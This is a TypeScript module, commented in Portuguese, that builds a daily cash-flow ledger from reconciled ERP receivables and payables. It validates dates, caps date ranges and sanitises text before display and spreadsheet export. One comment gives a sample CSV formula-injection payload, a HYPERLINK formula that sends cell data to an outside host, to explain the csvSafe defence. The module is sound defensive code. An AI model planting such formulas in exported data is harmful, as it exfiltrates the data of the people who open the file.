/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 *
 * dailyLedger.ts — Motor do MOVIMENTO DIÁRIO (caixa realizado, dia a dia).
 *
 * A PERGUNTA QUE ESTE MÓDULO RESPONDE
 * ===================================
 * "Quanto entrou e quanto saiu NO DIA 14?" — e a mesma pergunta somada de
 * 01/07 a 31/07. Não é previsão, não é competência: é CAIXA. Só entra aqui o
 * dinheiro que comprovadamente andou.
 *
 * A RÉGUA DA BAIXA (a decisão mais importante do arquivo)
 * ------------------------------------------------------
 * Um título só é contabilizado quando cumpre AS DUAS condições:
 *
 *   1. `status` ∈ { 'Baixado Automático', 'Baixado Manual' }
 *      → alguém (o motor de conciliação ou o gestor) casou o título com um
 *        lançamento real de extrato/caixa.
 *   2. `paymentDate` é uma data ISO válida
 *      → existe o DIA em que o dinheiro andou. Sem isso não há linha para
 *        somar; um título "baixado" sem data é erro de base, não movimento.
 *
 * Ficam DE FORA, deliberadamente:
 *   • 'Em Aberto'  — o ERP pode até dizer 'Pago', mas ninguém achou o
 *                    lançamento correspondente. Somar isso é inventar caixa.
 *   • 'Conferir'   — houve candidato abaixo do corte de confiança. É exatamente
 *                    o caso em que o número está mais provavelmente errado.
 *
 * Essa diferença — ERP diz pago, mas a baixa não existe — não é escondida: ela
 * vira o bloco `pendente` do resultado, para o gestor ver o tamanho do buraco
 * entre o que o ERP afirma e o que a conciliação comprova.
 *
 * PRECISÃO E FUSO
 * ---------------
 * Toda data é string ISO `YYYY-MM-DD` comparada lexicograficamente, nunca
 * `new Date()` em horário local (ver periodFilter.ts). Todo somatório passa por
 * `sumBy`/`round2`, que somam em centavos inteiros — 196 títulos somados em
 * ponto flutuante erram na 11ª casa e quebram a conferência contra o ERP.
 *
 * SUPERFÍCIE DE ATAQUE DESTE MÓDULO
 * ---------------------------------
 * Ele recebe (a) datas digitadas pelo usuário e (b) texto livre vindo do ERP,
 * que por sua vez veio de uma planilha que qualquer pessoa pode ter editado.
 * Por isso:
 *   • `parseIsoDate` valida o calendário de verdade (rejeita '2026-02-30') em
 *     vez de confiar no formato — `new Date('2026-02-30')` vira 02/03 calado.
 *   • `clampRange` limita o intervalo a MAX_RANGE_DAYS. Sem teto, digitar
 *     01/01/1900 a 31/12/2999 monta 400 mil linhas e derruba a aba do
 *     navegador: negação de serviço no próprio cliente.
 *   • `safeText` remove caracteres de controle do texto do ERP.
 *   • `csvSafe` neutraliza injeção de fórmula em CSV/XLSX (ver a função).
 * Nada aqui toca no DOM nem no Firestore — é código puro e testável.
 */

import { BaixaStatus, TituloFinanceiro, TituloMovType } from '../types';
import { lastDayOfMonth, round2, sumBy } from './periodFilter';

// ─── Limites defensivos ──────────────────────────────────────────────────────

/**
 * Teto do intervalo em dias (2 anos + folga de bissexto).
 *
 * O motor monta uma linha por dia do intervalo, inclusive dias sem movimento —
 * é isso que faz o "buraco" de caixa aparecer. A contrapartida é que o custo
 * cresce linearmente com o intervalo, então o intervalo precisa de teto.
 */
export const MAX_RANGE_DAYS = 732;

/** Faixa de anos aceita. Fora disso é dedo errado ou payload adulterado. */
export const MIN_YEAR = 2000;
export const MAX_YEAR = 2100;

/** Teto de títulos listados no detalhe de UM dia (a tela pagina o resto). */
export const MAX_DETAIL_ROWS = 500;

// ─── Datas: validação estrita ────────────────────────────────────────────────

const ISO_RE = /^(\d{4})-(\d{2})-(\d{2})$/;

/**
 * Valida `YYYY-MM-DD` contra o calendário real e devolve as partes.
 *
 * Checar só o formato não basta: '2026-02-30' e '2026-13-01' passam no regex e
 * o `new Date` os aceita rolando para o mês seguinte, silenciosamente. Num
 * relatório financeiro isso move dinheiro de mês sem avisar ninguém.
 */
export const parseIsoDate = (
  value: unknown
): { year: number; month: number; day: number } | null => {
  if (typeof value !== 'string') return null;
  const m = ISO_RE.exec(value.trim());
  if (!m) return null;
  const year = Number(m[1]);
  const month = Number(m[2]);
  const day = Number(m[3]);
  if (year < MIN_YEAR || year > MAX_YEAR) return null;
  if (month < 1 || month > 12) return null;
  if (day < 1 || day > lastDayOfMonth(year, month)) return null;
  return { year, month, day };
};

export const isIsoDate = (value: unknown): value is string => parseIsoDate(value) !== null;

/** Normaliza para ISO válido ou string vazia. Nunca lança. */
export const toIsoOrEmpty = (value: unknown): string => (isIsoDate(value) ? (value as string).trim() : '');

const pad2 = (n: number) => String(n).padStart(2, '0');

/** Dia da semana 0–6 (domingo=0) calculado em UTC — imune a horário de verão. */
export const weekdayIndex = (iso: string): number => {
  const p = parseIsoDate(iso);
  if (!p) return 0;
  return new Date(Date.UTC(p.year, p.month - 1, p.day)).getUTCDay();
};

export const WEEKDAY_SHORT = ['Dom', 'Seg', 'Ter', 'Qua', 'Qui', 'Sex', 'Sáb'] as const;

export const isWeekend = (iso: string): boolean => {
  const w = weekdayIndex(iso);
  return w === 0 || w === 6;
};

// ─── Intervalo com teto ──────────────────────────────────────────────────────

export interface ClampedRange {
  start: string;
  end: string;
  /** Quantos dias o intervalo cobre (fechado dos dois lados). */
  days: number;
  /** true quando a data final foi puxada para trás por causa do teto. */
  truncated: boolean;
  /** true quando as datas vieram invertidas e foram trocadas. */
  swapped: boolean;
  /** Motivo legível quando algo foi ajustado — a tela mostra ao usuário. */
  notice: string;
}

/**
 * Sanitiza o par (início, fim) vindo dos inputs de data.
 *
 * `<input type="date">` NÃO é barreira de segurança: o valor chega por
 * `e.target.value` e pode ser qualquer string via devtools, extensão ou
 * `sendKeys`. Toda a validação real acontece aqui.
 *
 * Regras, nesta ordem:
 *   1. datas inválidas caem para o mês de referência informado;
 *   2. início > fim são trocados (o usuário quis o intervalo, não o erro);
 *   3. intervalo maior que MAX_RANGE_DAYS tem o FIM puxado para trás — o
 *      começo é preservado porque é ele que o usuário costuma ter digitado
 *      com intenção.
 */
export const clampRange = (
  rawStart: unknown,
  rawEnd: unknown,
  fallback: { year: number; month: number }
): ClampedRange => {
  const fy = Number.isFinite(fallback.year)
    ? Math.min(MAX_YEAR, Math.max(MIN_YEAR, Math.trunc(fallback.year)))
    : new Date().getFullYear();
  const fm = Number.isFinite(fallback.month) ? Math.min(12, Math.max(1, Math.trunc(fallback.month))) : 1;

  const fbStart = `${fy}-${pad2(fm)}-01`;
  const fbEnd = `${fy}-${pad2(fm)}-${pad2(lastDayOfMonth(fy, fm))}`;

  let start = toIsoOrEmpty(rawStart) || fbStart;
  let end = toIsoOrEmpty(rawEnd) || fbEnd;

  let swapped = false;
  if (start > end) {
    [start, end] = [end, start];
    swapped = true;
  }

  const days = daysBetweenInclusive(start, end);
  let truncated = false;
  if (days > MAX_RANGE_DAYS) {
    end = addDays(start, MAX_RANGE_DAYS - 1);
    truncated = true;
  }

  const avisos: string[] = [];
  if (swapped) avisos.push('As datas estavam invertidas e foram trocadas.');
  if (truncated) avisos.push(`O período foi limitado a ${MAX_RANGE_DAYS} dias para não travar a tela.`);

  return {
    start,
    end,
    days: daysBetweenInclusive(start, end),
    truncated,
    swapped,
    notice: avisos.join(' '),
  };
};

/** Soma dias em UTC (só contagem de calendário, sem horário). */
export const addDays = (iso: string, days: number): string => {
  const p = parseIsoDate(iso);
  if (!p) return iso;
  const d = new Date(Date.UTC(p.year, p.month - 1, p.day) + days * 86400000);
  return `${d.getUTCFullYear()}-${pad2(d.getUTCMonth() + 1)}-${pad2(d.getUTCDate())}`;
};

/** Dias cobertos por [a, b] contando as duas pontas. 01→01 é 1 dia, não 0. */
export const daysBetweenInclusive = (a: string, b: string): number => {
  const pa = parseIsoDate(a);
  const pb = parseIsoDate(b);
  if (!pa || !pb) return 0;
  const diff = Date.UTC(pb.year, pb.month - 1, pb.day) - Date.UTC(pa.year, pa.month - 1, pa.day);
  return Math.floor(diff / 86400000) + 1;
};

/** Primeiro e último dia do mês de referência. */
export const monthRange = (year: number, month: number): { start: string; end: string } => {
  const y = Math.min(MAX_YEAR, Math.max(MIN_YEAR, Math.trunc(year) || new Date().getFullYear()));
  const m = Math.min(12, Math.max(1, Math.trunc(month) || 1));
  return { start: `${y}-${pad2(m)}-01`, end: `${y}-${pad2(m)}-${pad2(lastDayOfMonth(y, m))}` };
};

/** Mês de referência de hoje — o estado inicial da tela. */
export const currentMonthRef = (): { year: number; month: number } => {
  const d = new Date();
  return { year: d.getFullYear(), month: d.getMonth() + 1 };
};

// ─── Higienização de texto ───────────────────────────────────────────────────

/**
 * Limpa texto livre do ERP para exibição.
 *
 * O React já escapa HTML na renderização, então isto não é a defesa contra XSS
 * (a defesa é não existir `dangerouslySetInnerHTML` nesta tela). O que remove:
 * caracteres de controle e bidirecionais — os U+202E e amigos permitem
 * escrever "FORNECEDOR ⁧" e fazer o nome aparecer invertido/mascarado na tela,
 * o truque clássico de Trojan Source aplicado a nome de fornecedor.
 */
export const safeText = (value: unknown, maxLen = 160): string => {
  if (value === null || value === undefined) return '';
  const s = String(value)
    // Controles C0/C1 (inclui NUL, TAB, CR, LF) viram espaco simples.
    // eslint-disable-next-line no-control-regex
    .replace(/[\u0000-\u001F\u007F-\u009F]/g, ' ')
    // Zero-width e marcas bidirecionais (Trojan Source): removidas de vez.
    .replace(/[\u200B-\u200F\u202A-\u202E\u2066-\u2069\uFEFF]/g, '')
    .replace(/\s+/g, ' ')
    .trim();
  return s.length > maxLen ? `${s.slice(0, maxLen - 1)}…` : s;
};

/**
 * Neutraliza injeção de fórmula em CSV/XLSX.
 *
 * Excel e LibreOffice EXECUTAM a célula que começa com `=`, `+`, `-`, `@`, TAB
 * ou CR. Um fornecedor cadastrado no ERP como
 * `=HYPERLINK("http://x/?"&A1,"Clique")` vira exfiltração de dados quando o
 * gestor abre o relatório exportado — e o ataque não passa por lugar nenhum
 * que este sistema controle: entra pelo cadastro do ERP e sai pelo Excel.
 * Prefixar com aspa simples faz a célula virar texto.
 */
export const csvSafe = (value: unknown): string => {
  const s = safeText(value, 400);
  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
};

// ─── Regra de baixa ──────────────────────────────────────────────────────────

/** Os dois status que significam "conciliado": o dinheiro tem lastro no extrato. */
export const BAIXADO_STATUSES: readonly BaixaStatus[] = ['Baixado Automático', 'Baixado Manual'];

const BAIXADO_SET = new Set<string>(BAIXADO_STATUSES);

/** O título está BAIXADO e tem data de pagamento válida? Só então ele entra no somatório. */
export const isSettled = (t: TituloFinanceiro): boolean => {
  if (!t) return false;
  const isPaidStatus = BAIXADO_SET.has(t.status);
  if (!isPaidStatus || !isIsoDate(t.paymentDate)) return false;
  return true;
};

/**
 * O ERP diz que foi pago, mas a baixa não existe (ou está em 'Conferir').
 */
export const isPendingSettlement = (t: TituloFinanceiro): boolean =>
  !!t && !isSettled(t) && (t.isPaid === true || isIsoDate(t.paymentDate));

/**
 * Quanto de dinheiro este título moveu. Prioriza o valor pago digitado pelo gestor.
 */
export const settledAmount = (t: TituloFinanceiro): number => {
  if (t?.paidAmount !== undefined && Number.isFinite(t.paidAmount) && t.paidAmount > 0) {
    return round2(t.paidAmount);
  }
  const bruto = round2(Number(t?.amount) || 0);
  const saldo = round2(Number(t?.balance) || 0);
  if (!Number.isFinite(bruto) || bruto <= 0) return 0;
  if (saldo > 0 && saldo < bruto) return round2(bruto - saldo);
  return bruto;
};

/** Pagamento parcial: entrou parte do valor. Vira etiqueta no detalhe. */
export const isPartial = (t: TituloFinanceiro): boolean => {
  const bruto = round2(Number(t?.amount) || 0);
  const saldo = round2(Number(t?.balance) || 0);
  return saldo > 0 && saldo < bruto;
};

// ─── Estruturas do resultado ─────────────────────────────────────────────────

/** Um título já resolvido para a tela — nada de cálculo dentro do render. */
export interface LedgerEntry {
  id: string;
  titleCode: string;
  movType: TituloMovType;
  personName: string;
  personCode: string;
  titleNumber: string;
  parcela: string;
  titleType: string;
  department: string;
  collectionAgent: string;
  dueDate: string;
  paymentDate: string;
  amount: number;
  balance: number;
  /** Valor efetivamente movimentado (ver `settledAmount`). */
  settled: number;
  partial: boolean;
  status: BaixaStatus;
  baixaCode: string;
  /** Dias entre vencimento e pagamento: negativo = adiantado, positivo = atraso. */
  delayDays: number;
}

/** Um lado do movimento (receber ou pagar) em UM dia. */
export interface DaySide {
  total: number;
  count: number;
  entries: LedgerEntry[];
}

export interface DayRow {
  date: string;
  weekday: string;
  weekend: boolean;
  receber: DaySide;
  pagar: DaySide;
  /** receber − pagar no dia. */
  net: number;
  /** Soma dos `net` do primeiro dia do período até este. */
  accumulated: number;
}

export interface SideTotals {
  total: number;
  count: number;
  /** Média por dia COM movimento (dia zerado não dilui a média). */
  avgPerActiveDay: number;
  maiorDia: { date: string; total: number } | null;
}

export interface PendingBlock {
  count: number;
  total: number;
  /** Quebra por status de baixa, para saber onde está travado. */
  porStatus: Record<string, { count: number; total: number }>;
}

export interface DailyLedger {
  range: ClampedRange;
  rows: DayRow[];
  receber: SideTotals;
  pagar: SideTotals;
  /** receber − pagar no período inteiro. */
  net: number;
  /** Dias do intervalo que tiveram algum movimento. */
  activeDays: number;
  /** Pendências: ERP diz pago, conciliação não confirma. */
  pendenteReceber: PendingBlock;
  pendentePagar: PendingBlock;
  /** Títulos baixados que caíram FORA do intervalo — contexto do recorte. */
  foraDoPeriodo: { receber: number; pagar: number };
}

// ─── Agregação ───────────────────────────────────────────────────────────────

const toEntry = (t: TituloFinanceiro): LedgerEntry => ({
  id: String(t.id || ''),
  titleCode: safeText(t.titleCode, 40),
  movType: t.movType,
  personName: safeText(t.personName, 80) || '(sem nome)',
  personCode: safeText(t.personCode, 30),
  titleNumber: safeText(t.titleNumber, 40),
  parcela: safeText(t.parcela, 30),
  titleType: safeText(t.titleType, 40),
  department: safeText(t.department, 50),
  collectionAgent: safeText(t.collectionAgent, 50),
  dueDate: toIsoOrEmpty(t.dueDate),
  paymentDate: toIsoOrEmpty(t.paymentDate),
  amount: round2(Number(t.amount) || 0),
  balance: round2(Number(t.balance) || 0),
  settled: settledAmount(t),
  partial: isPartial(t),
  status: t.status,
  baixaCode: safeText(t.baixaCode, 30),
  delayDays: isIsoDate(t.dueDate) && isIsoDate(t.paymentDate)
    ? daysBetweenInclusive(t.dueDate, t.paymentDate) - 1
    : 0,
});

const emptySide = (): DaySide => ({ total: 0, count: 0, entries: [] });

const sideTotals = (rows: DayRow[], pick: (r: DayRow) => DaySide): SideTotals => {
  const ativos = rows.filter((r) => pick(r).count > 0);
  const total = sumBy(rows, (r) => pick(r).total);
  const count = rows.reduce((acc, r) => acc + pick(r).count, 0);
  let maior: { date: string; total: number } | null = null;
  for (const r of ativos) {
    const s = pick(r);
    if (!maior || s.total > maior.total) maior = { date: r.date, total: s.total };
  }
  return {
    total,
    count,
    avgPerActiveDay: ativos.length ? round2(total / ativos.length) : 0,
    maiorDia: maior,
  };
};

const buildPending = (titulos: TituloFinanceiro[]): PendingBlock => {
  const porStatus: Record<string, { count: number; total: number }> = {};
  let total = 0;
  let count = 0;
  for (const t of titulos) {
    const v = round2(Number(t.amount) || 0);
    const k = t.status || 'Em Aberto';
    if (!porStatus[k]) porStatus[k] = { count: 0, total: 0 };
    porStatus[k].count += 1;
    porStatus[k].total = round2(porStatus[k].total + v);
    total = round2(total + v);
    count += 1;
  }
  return { count, total, porStatus };
};

export interface BuildOptions {
  /** Não gerar linha para dias sem nenhum movimento nos dois lados. */
  hideEmptyDays?: boolean;
  /** Filtro por texto (pessoa, nº do título, departamento). Já vem digitado. */
  search?: string;
  /** Teto de títulos guardados no detalhe de cada dia. */
  maxDetailRows?: number;
}

/**
 * Monta o livro diário do período.
 *
 * A espinha do resultado é o CALENDÁRIO, não os títulos: um dia sem pagamento
 * nenhum precisa aparecer com zero, senão o gestor lê "sexta e segunda" como
 * dias consecutivos e não enxerga o fim de semana de caixa parado. Quem quiser
 * a lista compacta liga `hideEmptyDays`.
 */
export const buildDailyLedger = (
  receivables: TituloFinanceiro[],
  payables: TituloFinanceiro[],
  range: ClampedRange,
  options: BuildOptions = {}
): DailyLedger => {
  const { hideEmptyDays = false, maxDetailRows = MAX_DETAIL_ROWS } = options;
  const termo = safeText(options.search, 80).toLowerCase();

  const matches = (t: TituloFinanceiro): boolean => {
    if (!termo) return true;
    return (
      safeText(t.personName, 80).toLowerCase().includes(termo) ||
      safeText(t.personCode, 30).toLowerCase().includes(termo) ||
      safeText(t.titleNumber, 40).toLowerCase().includes(termo) ||
      safeText(t.titleCode, 40).toLowerCase().includes(termo) ||
      safeText(t.department, 50).toLowerCase().includes(termo) ||
      safeText(t.collectionAgent, 50).toLowerCase().includes(termo)
    );
  };

  // Índice dia → lado. Um Map evita varrer a base inteira por dia do intervalo:
  // com 60 dias e 5 mil títulos, o laço aninhado faria 300 mil comparações.
  const idx = new Map<string, { receber: TituloFinanceiro[]; pagar: TituloFinanceiro[] }>();
  const fora = { receber: 0, pagar: 0 };
  const pendR: TituloFinanceiro[] = [];
  const pendP: TituloFinanceiro[] = [];

  const indexar = (lista: TituloFinanceiro[], lado: 'receber' | 'pagar', pend: TituloFinanceiro[]) => {
    for (const t of Array.isArray(lista) ? lista : []) {
      if (!t) continue;
      if (!isSettled(t)) {
        if (isPendingSettlement(t) && matches(t)) {
          const d = toIsoOrEmpty(t.paymentDate);
          // A pendência é do período pelo dia de pagamento quando ele existe;
          // sem data de pagamento, ela é do período pelo VENCIMENTO — é assim
          // que o título vencido e nunca baixado aparece no mês certo.
          const ref = d || toIsoOrEmpty(t.dueDate);
          if (ref && ref >= range.start && ref <= range.end) pend.push(t);
        }
        continue;
      }
      const dia = toIsoOrEmpty(t.paymentDate);
      if (dia < range.start || dia > range.end) {
        fora[lado] += 1;
        continue;
      }
      if (!matches(t)) continue;
      let slot = idx.get(dia);
      if (!slot) {
        slot = { receber: [], pagar: [] };
        idx.set(dia, slot);
      }
      slot[lado].push(t);
    }
  };

  indexar(receivables, 'receber', pendR);
  indexar(payables, 'pagar', pendP);

  const rows: DayRow[] = [];
  let acumulado = 0;

  for (let cursor = range.start, guard = 0; cursor <= range.end && guard <= MAX_RANGE_DAYS; cursor = addDays(cursor, 1), guard += 1) {
    const slot = idx.get(cursor);
    const montaLado = (lista: TituloFinanceiro[] | undefined): DaySide => {
      if (!lista || lista.length === 0) return emptySide();
      const ordenada = [...lista].sort((a, b) => settledAmount(b) - settledAmount(a));
      return {
        total: sumBy(ordenada, settledAmount),
        count: ordenada.length,
        entries: ordenada.slice(0, maxDetailRows).map(toEntry),
      };
    };

    const receber = montaLado(slot?.receber);
    const pagar = montaLado(slot?.pagar);
    const net = round2(receber.total - pagar.total);
    acumulado = round2(acumulado + net);

    if (hideEmptyDays && receber.count === 0 && pagar.count === 0) continue;

    rows.push({
      date: cursor,
      weekday: WEEKDAY_SHORT[weekdayIndex(cursor)],
      weekend: isWeekend(cursor),
      receber,
      pagar,
      net,
      accumulated: acumulado,
    });
  }

  const receberTot = sideTotals(rows, (r) => r.receber);
  const pagarTot = sideTotals(rows, (r) => r.pagar);

  return {
    range,
    rows,
    receber: receberTot,
    pagar: pagarTot,
    net: round2(receberTot.total - pagarTot.total),
    activeDays: rows.filter((r) => r.receber.count > 0 || r.pagar.count > 0).length,
    pendenteReceber: buildPending(pendR),
    pendentePagar: buildPending(pendP),
    foraDoPeriodo: fora,
  };
};

// ─── Recortes derivados (alimentam os painéis da tela) ───────────────────────

export interface PersonRollup {
  key: string;
  name: string;
  code: string;
  total: number;
  count: number;
  share: number;
}

/**
 * Concentração por pessoa no período.
 *
 * Agrupa pelo CÓDIGO da pessoa, não pelo nome: o mesmo fornecedor aparece como
 * "AUTO PECAS LTDA" e "AUTO PEÇAS LTDA." no cadastro do ERP, e agrupar por
 * nome quebraria o mesmo fornecedor em dois. Sem código, cai no nome
 * normalizado — melhor agrupar razoavelmente do que não agrupar.
 */
export const rollupByPerson = (
  rows: DayRow[],
  side: 'receber' | 'pagar',
  limit = 10
): PersonRollup[] => {
  const mapa = new Map<string, PersonRollup>();
  let total = 0;
  for (const r of rows) {
    for (const e of r[side].entries) {
      const key = e.personCode || e.personName.toLowerCase();
      const atual = mapa.get(key) || { key, name: e.personName, code: e.personCode, total: 0, count: 0, share: 0 };
      atual.total = round2(atual.total + e.settled);
      atual.count += 1;
      mapa.set(key, atual);
      total = round2(total + e.settled);
    }
  }
  return Array.from(mapa.values())
    .map((p) => ({ ...p, share: total > 0 ? round2((p.total / total) * 100) : 0 }))
    .sort((a, b) => b.total - a.total)
    .slice(0, Math.max(1, limit));
};

/** Todos os títulos do período achatados num array só — usado na exportação. */
export const flattenEntries = (rows: DayRow[], side: 'receber' | 'pagar' | 'ambos' = 'ambos'): LedgerEntry[] => {
  const out: LedgerEntry[] = [];
  for (const r of rows) {
    if (side !== 'pagar') out.push(...r.receber.entries);
    if (side !== 'receber') out.push(...r.pagar.entries);
  }
  return out;
};

/**
 * Linhas prontas para a planilha, com TODO texto passando por `csvSafe`.
 *
 * Esta é a única saída do módulo que vai parar dentro do Excel, então é aqui
 * que a neutralização de fórmula tem de acontecer — depois é tarde.
 */
export const toSheetRows = (ledger: DailyLedger): Record<string, string | number>[] =>
  ledger.rows.map((r) => ({
    Data: `${r.date.slice(8, 10)}/${r.date.slice(5, 7)}/${r.date.slice(0, 4)}`,
    'Dia da semana': csvSafe(r.weekday),
    'Qtd recebimentos': r.receber.count,
    'Total recebido': r.receber.total,
    'Qtd pagamentos': r.pagar.count,
    'Total pago': r.pagar.total,
    'Saldo do dia': r.net,
    'Saldo acumulado': r.accumulated,
  }));

/** Detalhe título a título, também higienizado para planilha. */
export const toDetailSheetRows = (
  entries: LedgerEntry[]
): Record<string, string | number>[] =>
  entries.map((e) => ({
    Movimento: e.movType === 'R' ? 'Recebimento' : 'Pagamento',
    'Data pagamento': e.paymentDate ? `${e.paymentDate.slice(8, 10)}/${e.paymentDate.slice(5, 7)}/${e.paymentDate.slice(0, 4)}` : '',
    'Data vencimento': e.dueDate ? `${e.dueDate.slice(8, 10)}/${e.dueDate.slice(5, 7)}/${e.dueDate.slice(0, 4)}` : '',
    'Atraso (dias)': e.delayDays,
    Pessoa: csvSafe(e.personName),
    'Cód. pessoa': csvSafe(e.personCode),
    'Nº título': csvSafe(e.titleNumber),
    Parcela: csvSafe(e.parcela),
    Tipo: csvSafe(e.titleType),
    Departamento: csvSafe(e.department),
    'Agente/Conta': csvSafe(e.collectionAgent),
    'Valor do título': e.amount,
    Saldo: e.balance,
    'Valor baixado': e.settled,
    Parcial: e.partial ? 'Sim' : 'Não',
    'Status baixa': csvSafe(e.status),
    'Cód. baixa': csvSafe(e.baixaCode),
  }));
